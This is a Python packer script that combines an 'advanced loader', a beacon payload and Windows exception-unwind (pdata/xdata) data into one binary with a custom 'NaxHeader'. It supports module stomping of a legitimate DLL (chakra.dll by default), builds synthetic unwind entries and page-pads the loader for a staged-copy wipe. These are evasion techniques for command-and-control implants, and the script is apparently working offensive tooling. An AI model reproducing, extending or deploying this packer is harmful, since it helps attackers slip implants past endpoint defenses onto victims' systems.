#!/usr/bin/env python3
"""Pack advanced loader + beacon + pdata + xdata into nax_adv.bin with NaxHeader v2."""

import argparse
import struct
import sys
import os


NAX_HDR_MAGIC   = 0x4E415832
NAX_HDR_SIZE    = 160
NAX_HDR_DLL_MAX = 64

FLAG_MODULE_STOMP = 0x0001
FLAG_STOMP_PDATA  = 0x0002


def read_bin(path):
    if not path or not os.path.exists(path):
        return b""
    with open(path, "rb") as f:
        return f.read()


def strip_loader_padding(loader):
    stripped = loader.rstrip(b'\x00')
    padding = (16 - (len(stripped) % 16)) % 16
    return stripped + b'\x00' * padding


def read_text_rva(path):
    if not path or not os.path.exists(path):
        return 0
    with open(path, "r") as f:
        val = f.read().strip()
    if not val:
        return 0
    return int(val, 16)


def normalize_pdata(pdata, text_rva, xdata_rva):
    if not pdata or len(pdata) < 12:
        return pdata
    out = bytearray(pdata)
    entry_count = len(out) // 12
    for i in range(entry_count):
        off = i * 12
        begin, end, unwind = struct.unpack_from("<III", out, off)
        begin  -= text_rva
        end    -= text_rva
        unwind -= xdata_rva
        struct.pack_into("<III", out, off,
                         begin & 0xFFFFFFFF,
                         end & 0xFFFFFFFF,
                         unwind & 0xFFFFFFFF)
    return bytes(out)


def build_entry_unwind():
    UWOP_PUSH_NONVOL = 0
    UWOP_ALLOC_SMALL = 2
    UWOP_SET_FPREG   = 3
    RSI = 6

    unwind_info = struct.pack("<BBBB",
        0x01, 0x0C, 3, (0 << 4) | RSI)
    unwind_info += struct.pack("<BB", 0x08, (3 << 4) | UWOP_ALLOC_SMALL)
    unwind_info += struct.pack("<BB", 0x01, (0 << 4) | UWOP_SET_FPREG)
    unwind_info += struct.pack("<BB", 0x00, (RSI << 4) | UWOP_PUSH_NONVOL)
    unwind_info += b"\x00\x00"

    runtime_func = struct.pack("<III", 0x0000, 0x0016, 0)
    return runtime_func, unwind_info


def encode_dll_name(name):
    wchars = name.encode("utf-16-le")
    wchars += b"\x00\x00"
    buf = bytearray(NAX_HDR_DLL_MAX * 2)
    if len(wchars) > len(buf):
        print(f"ERROR: DLL name too long ({len(name)} chars)", file=sys.stderr)
        sys.exit(1)
    buf[:len(wchars)] = wchars
    return bytes(buf)


def build_header(beacon_size, pdata_size, xdata_size, text_rva, flags, dll_name):
    hdr = struct.pack("<IIIIII",
        NAX_HDR_MAGIC,
        beacon_size,
        pdata_size,
        xdata_size,
        text_rva,
        flags,
    )
    hdr += encode_dll_name(dll_name)
    hdr += b"\x00" * 8
    assert len(hdr) == NAX_HDR_SIZE
    return hdr


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--loader", required=True)
    parser.add_argument("--beacon", required=True)
    parser.add_argument("--pdata", default="")
    parser.add_argument("--xdata", default="")
    parser.add_argument("--text-rva", default="")
    parser.add_argument("--stomp-dll", default="chakra.dll")
    parser.add_argument("--module-stomp", action="store_true")
    parser.add_argument("--stomp-pdata", action="store_true")
    parser.add_argument("--output", required=True)
    parser.add_argument("--legacy", action="store_true")
    args = parser.parse_args()

    loader = strip_loader_padding(read_bin(args.loader))
    beacon = read_bin(args.beacon)

    if not loader:
        print("ERROR: loader binary is empty", file=sys.stderr)
        sys.exit(1)
    if not beacon:
        print("ERROR: beacon binary is empty", file=sys.stderr)
        sys.exit(1)

    if args.legacy:
        hdr = struct.pack("<I", len(beacon))
        payload = loader + hdr + beacon
    else:
        pdata    = read_bin(args.pdata)
        xdata    = read_bin(args.xdata)
        text_rva = read_text_rva(args.text_rva)

        flags = 0
        if args.module_stomp:
            flags |= FLAG_MODULE_STOMP
        if args.stomp_pdata:
            flags |= FLAG_STOMP_PDATA

        if pdata and text_rva:
            align4 = lambda x: (x + 3) & ~3
            xdata_rva = text_rva + align4(len(beacon)) + align4(len(pdata))
            pdata = normalize_pdata(pdata, text_rva, xdata_rva)

            entry_rf, entry_ui = build_entry_unwind()
            ui_size = len(entry_ui)
            pdata_arr = bytearray(pdata)
            for i in range(len(pdata_arr) // 12):
                off = i * 12 + 8
                u = struct.unpack_from("<I", pdata_arr, off)[0]
                struct.pack_into("<I", pdata_arr, off, u + ui_size)
            pdata = bytes(entry_rf) + bytes(pdata_arr)
            xdata = bytes(entry_ui) + xdata

        hdr = build_header(len(beacon), len(pdata), len(xdata), text_rva, flags, args.stomp_dll)
        # Page-pad so the header starts at the next page boundary: the loader's
        # staged-copy wipe flips only the tail to RW, which must never include
        # a page holding loader code.
        page_pad = -len(loader) & 0xFFF
        payload = loader + b"\x00" * page_pad + hdr + beacon + pdata + xdata

    with open(args.output, "wb") as f:
        f.write(payload)

    print(f"[+] packed  {args.output}  ({len(payload)} bytes)")


if __name__ == "__main__":
    main()
